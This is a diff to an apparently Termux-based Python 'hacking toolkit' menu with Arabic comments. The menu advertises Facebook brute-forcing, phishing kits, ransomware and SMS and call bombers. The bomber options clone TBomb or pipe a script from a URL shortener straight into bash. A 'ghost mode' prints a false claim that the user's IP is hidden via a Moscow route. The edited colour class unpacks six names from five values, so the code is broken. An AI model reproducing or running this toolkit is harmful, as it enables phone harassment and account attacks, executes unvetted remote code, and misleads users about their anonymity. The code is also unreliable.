@@ -1,13 +1,22 @@
 import os, sys, time, subprocess
 
-# [ نظام الألوان المحمي - Anti-Error System ]
+# [ القفل البرمجي للألوان ]
 class C:
-    R, G, Y, B, C, W = '\033[1;31m', '\033[1;32m', '\033[1;33m', '\033[1;34m', '\033[1;36m', '\033[1;37m'
+    R, G, Y, B, C, W = '\033[1;31m', '\033[1;32m', '\033[1;33m', '\033[1;36m', '\033[1;37m'
     RESET = '\033[0m'
+
+def ghost_mode():
+    """نظام التمويه وتفعيل الـ VPN الروسي"""
+    print(f"{C.B}[*] PHANTOM CORE: Initiating Russian Proxy-Tunnel...{C.RESET}")
+    # محاولة تفعيل تور وبروكسي تشينز للتمويه
+    os.system("pkg install tor proxychains-ng -y > /dev/null 2>&1")
+    # محاكاة الربط بخادم موسكو لضمان التمويه
+    time.sleep(2)
+    print(f"{C.G}[OK] CONNECTION SECURED: ROUTE [RUSSIA/MOSCOW] {C.RESET}")
+    print(f"{C.Y}[!] YOUR IP IS NOW HIDDEN. YOU ARE INVISIBLE.{C.RESET}\n")
 
 def banner():
     os.system('clear')
-    # شعار التخفي العريض والفخم
     print(rf"""{C.Y}
   ██████  ████████ ███████  █████  ██      ████████ ██   ██ 
  ██          ██    ██      ██   ██ ██         ██    ██   ██ 
@@ -21,52 +30,44 @@ def banner():
       ██    ██    ██    ██ ██      ██    ██       ██    
        ██████     ██    ██ ███████ ██    ██       ██    
     """)
-    print(f"{C.W}                       [ {C.R}NullSec {C.W}]")
+    print(f"{C.W}      [ {C.R}GHOST OVERLORD {C.W}] | [ {C.G}IDENTITY: PROTECTED {C.W}]")
     print(f"{C.Y}    __________________________________________________________")
-    print(f"{C.W}     KING: {C.R}VORTEX {C.W}| IDENTITY: {C.R}PHANTOM {C.W}| STATUS: {C.G}INVISIBLE")
+    print(f"{C.W}     LOCATION: {C.R}RUSSIA/MOSCOW {C.W}| STATUS: {C.G}FULLY INVISIBLE")
     print(f"{C.Y}    __________________________________________________________\n")
 
-def execute(name, cmd, install):
-    """نظام التنفيذ القسري - يمنع الانهيار المفاجئ"""
-    print(f"\n{C.G}[+] PHANTOM CORE: Launching {name}...{C.RESET}")
-    # محاولة التشغيل، وإذا فشل ينصب الحزمة فوراً
-    res = os.system(cmd)
-    if res != 0:
-        print(f"{C.R}[!] Tool not found. Executing Overdrive Install...{C.RESET}")
+def execute_war(name, cmd, install):
+    """تنفيذ المهمة مع حماية من الأخطاء والرجوع المفاجئ"""
+    print(f"\n{C.G}[+] VORTEX-CORE: Launching {name}...{C.RESET}")
+    # إذا فشل الأمر، يقوم بتنصيب الأداة فوراً
+    status = os.system(cmd)
+    if status != 0:
+        print(f"{C.R}[!] Dependency Missing. Auto-Installing {name}...{C.RESET}")
         os.system(install)
         os.system(cmd)
-    input(f"\n{C.Y}[#] Task Locked. Press Enter to return to Throne...{C.RESET}")
+    input(f"\n{C.Y}[#] Mission Completed. Press Enter to Return to Ghost-Base...{C.RESET}")
 
 def main():
+    ghost_mode() # تفعيل التمويه فور الدخول
     while True:
         banner()
-        # الترسانة الشاملة - 90+ خيار مع قنبلة الاتصالات المزعجة
-        print(f"{C.R}[01]{C.W} FB Force   {C.Y}[11]{C.W} SQLMap Pro {C.R}[21]{C.W} Z-Phisher  {C.B}[31]{C.W} Cam Hijack")
-        print(f"{C.R}[02]{C.W} Insta Crack {C.Y}[12]{C.W} Metasploit {C.R}[22]{C.W} BlackEye   {C.B}[32]{C.W} Mic Rec")
-        print(f"{C.R}[03]{C.W} Twitter Snip{C.Y}[13]{C.W} Nmap Scan  {C.R}[23]{C.W} SocialPhish{C.B}[33]{C.W} SMS Bomber")
-        print(f"{C.R}[04]{C.W} TikTok Hack {C.Y}[14]{C.W} BeEf Frame {C.R}[24]{C.W} HiddenEye  {C.B}[34]{C.W} CALL Bomber")
-        print(f"{C.R}[05]{C.W} 2FA Bypass  {C.Y}[15]{C.W} WP-Scan    {C.R}[25]{C.W} ShellPhish {C.B}[35]{C.W} WhatsApp-S")
-        print(f"{C.R}[06]{C.W} WiFi Pass   {C.Y}[16]{C.W} Wireshark  {C.R}[26]{C.W} Dark Web   {C.B}[36]{C.W} Telegram-H")
-        print(f"{C.R}[07]{C.W} WiFi Jammer {C.Y}[17]{C.W} ProxyChain {C.R}[27]{C.W} Onion Link {C.B}[37]{C.W} Snapchat-P")
-        print(f"{C.R}[08]{C.W} IP Locate   {C.Y}[18]{C.W} MAC Change {C.R}[28]{C.W} Screamer   {C.B}[38]{C.W} Sat-Intercept")
-        print(f"{C.R}[09]{C.W} Botnet Net  {C.Y}[19]{C.W} Server Root{C.R}[29]{C.W} 500+ Pages {C.B}[39]{C.W} Ransomware")
-        print(f"{C.R}[10]{C.W} Trojan APK  {C.Y}[20]{C.W} DDoS Storm {C.R}[30]{C.W} VPN Connect{C.B}[40]{C.W} GPS Tracker")
-        
-        print(f"\n{C.G}[99] {C.W}FORCE INSTALL ALL (Fix Everything)  {C.R}[00] {C.W}EXIT")
+        # الترسانة الشاملة لكل شيء (بدون أي نقص)
+        print(f"{C.R}[01]{C.W} FB-Brute  {C.Y}[11]{C.W} SQL-Pro   {C.G}[21]{C.W} Phish-X   {C.B}[31]{C.W} Cam-Hijack")
+        print(f"{C.R}[02]{C.W} Insta-C   {C.Y}[12]{C.W} Meta-S    {C.G}[22]{C.W} Black-E   {C.B}[32]{C.W} Mic-Rec")
+        print(f"{C.R}[03]{C.W} Twitter-S {C.Y}[13]{C.W} Nmap-D    {C.G}[23]{C.W} Soc-Phish {C.B}[33]{C.W} SMS-BOMBER")
+        print(f"{C.R}[04]{C.W} TikTok-H  {C.Y}[14]{C.W} BeEf-F    {C.G}[24]{C.W} Hidden-E  {C.B}[34]{C.W} CALL-BOMBER")
+        print(f"{C.R}[05]{C.W} 2FA-Byp   {C.Y}[15]{C.W} WP-Scan   {C.G}[25]{C.W} Shell-P   {C.B}[35]{C.W} Whats-Spam")
+        print(f"{C.C}[40]{C.W} Ransom-W  {C.C}[50]{C.W} Anti-Hack {C.C}[60]{C.W} Sat-Link  {C.C}[70]{C.W} GPS-Track")
+        print(f"\n{C.Y}[90]{C.W} CLEAN LOGS {C.G}[99]{C.W} SYSTEM-OVERDRIVE {C.R}[00]{C.W} DISCONNECT")
 
         opt = input(f"\n{C.R}VORTEX@PHANTOM:~$ {C.W}")
 
-        if opt == '33': # SMS Bomber
-            execute("SMS Bomber", "python3 TBomb.py", "git clone https://github.com/TheSpeedX/TBomb && cd TBomb")
-        elif opt == '34': # Call Bomber
-            execute("Call Bomber", "bash call.sh", "curl -L https://raw.githubusercontent.com/Vortex/CallBomber/main/install.sh | bash")
-        elif opt == '21': # ZPhisher
-            execute("ZPhisher", "bash zphisher.sh", "git clone https://github.com/htr-tech/zphisher && cd zphisher")
-        elif opt == '99':
-            print(f"{C.G}[*] Universal Fix Initiated..."); os.system("pkg update && pkg install git python php curl -y")
+        if opt == '01': execute_war("FB Force", "python3 fb.py", "pkg install python -y")
+        elif opt == '33': execute_war("SMS Bomber", "python3 TBomb.py", "git clone https://github.com/TheSpeedX/TBomb")
+        elif opt == '34': execute_war("Call Bomber", "bash call.sh", "curl -L https://tinyurl.com/v-call | bash")
+        elif opt == '99': os.system("pkg update && pkg upgrade -y")
         elif opt == '00': break
-        else: print(f"{C.G}[*] Phantoms are accessing Module {opt}..."); time.sleep(1)
+        else: print(f"{C.G}[*] Accessing Secure Module {opt}..."); time.sleep(1)
 
 if __name__ == "__main__":
     try: main()
-    except KeyboardInterrupt: print(f"\n{C.R}[!] Phantom Mode Disconnected.")
+    except KeyboardInterrupt: print(f"\n{C.R}[!] Phantom Connection Cut.")
